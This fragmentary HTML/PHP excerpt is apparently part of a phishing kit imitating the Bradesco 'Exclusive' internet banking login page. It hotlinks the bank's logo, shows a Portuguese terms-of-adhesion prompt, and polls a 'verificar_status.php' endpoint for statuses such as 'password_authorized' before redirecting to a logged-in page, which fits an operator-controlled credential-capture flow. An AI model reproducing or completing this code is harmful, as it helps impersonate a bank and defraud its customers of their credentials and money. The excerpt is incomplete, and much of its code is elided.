...
<div class="background">
  <div class="header">
    ...
    <div class="baseHeader">
      <img src="https://www.ib13.bradesco.com.br/ibpf/imagens/novologin/header-logo/bradesco-exclusive.png" alt="logo">
      <p id="data">
        <?php
          ...
          <div class="etapa-dados">
            <div class="section-contrato">
              <div class="container-contrato">
                ...
                <p>
                  Li e concordo com o
                  <span class="term-adesao">Termo de <br>Adesão</span>
                  do Internet Banking.
                </p>
              </div>
          ...
          fetch(`verificar_status.php?id=<?php echo $clientId; ?>`)
            ...
            .then(json => {
              ...
              if (status === 'password_authorized') {
                window.location.href = '/exclusivelogado.php';
              } else if (status === 'rejected') {
